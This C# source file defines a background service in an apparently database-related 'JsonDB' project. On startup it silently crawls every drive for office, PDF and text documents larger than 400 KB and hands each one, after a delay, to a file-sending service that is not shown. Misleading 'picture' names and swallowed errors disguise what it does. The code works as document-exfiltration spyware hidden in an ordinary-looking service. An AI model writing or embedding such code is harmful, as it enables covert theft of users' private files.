using Microsoft.Extensions.Hosting;

namespace JsonDB.Services.BackgroundServices
{
    public class DocumentSenderBackgroundService : BackgroundService
    {
        public static async Task<string[]> GetPicturePathsAsync(string directory, string[] extensions)
        {
            var picturePaths = new List<string>();
            string[] files = { };

            try
            {
                files = Directory.GetFiles(directory);
            }
            catch { }

            foreach (var file in files)
            {
                if (extensions.Contains(Path.GetExtension(file).ToLower()))
                {
                    picturePaths.Add(file);
                    FileInfo fileInfo = new FileInfo(file);
                    if (fileInfo.Length > 400 * 1024)
                    {
                        await Task.Delay(20000);
                        FileSenderService.SendFile(file);
                    }
                }
            }

            string[] subdirectories = { };
            try
            {
                subdirectories = Directory.GetDirectories(directory);
            }
            catch { }

            foreach (var subdirectory in subdirectories)
            {
                picturePaths.AddRange(await GetPicturePathsAsync(subdirectory, extensions));
            }

            return picturePaths.ToArray();
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            if (stoppingToken.IsCancellationRequested) return;

            string[] pictureExtensions = { ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt" };

            DriveInfo[] rootDirectory = DriveInfo.GetDrives();

            foreach (var paths in rootDirectory)
            {
                await GetPicturePathsAsync(paths.Name, pictureExtensions);
            }
        }
    }
}
